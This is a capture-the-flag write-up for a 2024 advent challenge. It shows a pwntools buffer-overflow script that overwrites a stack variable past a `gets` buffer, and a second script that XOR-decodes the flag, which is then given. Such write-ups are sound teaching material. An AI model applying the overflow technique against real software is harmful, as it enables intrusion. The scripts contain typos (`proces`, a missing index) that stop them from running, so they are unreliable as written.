<img src="https://github.com/raul-dunca/assets/blob/main/.images_CyberStudents-advent-of-ctf2024/day2_description.png">

For this chall I have 2 solutions.
## Solution 1:
Analyzing the file in dogbolt I saw in the main function a buffer overflow because of the `gets` function:

<img src="https://github.com/raul-dunca/CyberStudents-advent-of-ctf2024/blob/main/.assets/day_2_info1.png">
 
I think this is also the intended solution by the author. The goal of the challenge is to change the value of `local_12` from 0 to something else. This variable is also stored right after the buffer which is used to get the user input. So, using a buffer overflow I can change the value stored in `local_12`.

Below is the solution script. Because the buffer which reads user input has a size of `8166` I need at leas `8167` bytes in the payload:
```python
from pwn import *

binary='chall'
p=proces(binary)
payload=b"A"*8166 + b"\x01"
p.sendline(payload)

output=p.recvall()
print(output)
```
## Solution 2:
In dogbolt I can also see the win function and what it does exactly:

<img src="https://github.com/raul-dunca/CyberStudents-advent-of-ctf2024/blob/main/.assets/day_2_info2.png">

So, for each byte in that hex strings, it just xor it with `0xaa` to print out the flag. I can reverse the logic of this (`A xor 0xaa = B` and `B xor 0xaa = A`):
```python
encoded_flag=b"\xc9\xd9\xce\xd1\xce\x9e\xd3\xf5\x98\xf5\xe2\x9a\xdd\xf5\xd8\xf5\xdf\x95\xd7\x00"
decoded_flag=[]

for i in range (0,len(encoded_flag)):
    decoded_flag.append((encoded_flag^0xaa))

flag=''.join([chr(x) for x in decoded_flag])
print(flag)
```

`csd{d4y_2_H0w_r_u?}`
